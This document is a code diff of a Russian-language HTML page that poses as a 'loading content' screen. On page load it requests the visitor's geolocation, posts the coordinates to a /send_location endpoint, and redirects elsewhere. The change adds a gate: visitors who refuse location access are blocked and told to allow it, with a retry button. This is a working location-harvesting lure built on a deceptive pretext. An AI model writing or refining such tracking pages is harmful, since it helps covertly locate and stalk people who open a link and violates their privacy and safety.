@@ -15,13 +15,27 @@
     .message {
       font-size: 20px;
     }
+    #retry-btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border: none;
+      background-color: #0078D7;
+      color: white;
+      border-radius: 5px;
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <div class="message">Загружаем контент, пожалуйста, подождите...</div>
+  <div class="message" id="message">Загружаем контент, пожалуйста, подождите...</div>
+  <button id="retry-btn">Попробовать снова</button>
+
   <script>
     let redirectUrl = "https://yandex.ru";
 
+    // Получаем редирект с сервера
     fetch('/get_redirect')
       .then(res => res.json())
       .then(data => {
@@ -31,27 +45,42 @@
         console.warn('Не удалось получить redirect_url, будет использоваться запасной');
       })
       .finally(() => {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            fetch('/send_location', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude
-              })
-            }).catch(() => {
-              console.warn('Не удалось отправить геолокацию');
-            }).finally(() => {
-              setTimeout(() => window.location.href = redirectUrl, 2000);
-            });
-          },
-          err => {
-            console.warn('Геолокация не получена или пользователь отказался');
-            setTimeout(() => window.location.href = redirectUrl, 1500);
-          }
-        );
+        requestLocation();
       });
+
+    const messageEl = document.getElementById('message');
+    const retryBtn = document.getElementById('retry-btn');
+
+    retryBtn.onclick = () => {
+      messageEl.textContent = 'Загружаем контент, пожалуйста, подождите...';
+      retryBtn.style.display = 'none';
+      requestLocation();
+    };
+
+    function requestLocation() {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          // При успехе — отправляем координаты и редиректим
+          fetch('/send_location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            })
+          }).catch(() => {
+            console.warn('Не удалось отправить геолокацию');
+          }).finally(() => {
+            window.location.href = redirectUrl;
+          });
+        },
+        err => {
+          // При отказе показываем сообщение и кнопку
+          messageEl.textContent = 'Для доступа к сайту разрешите доступ к своей геопозиции';
+          retryBtn.style.display = 'inline-block';
+        }
+      );
+    }
   </script>
 </body>
 </html>
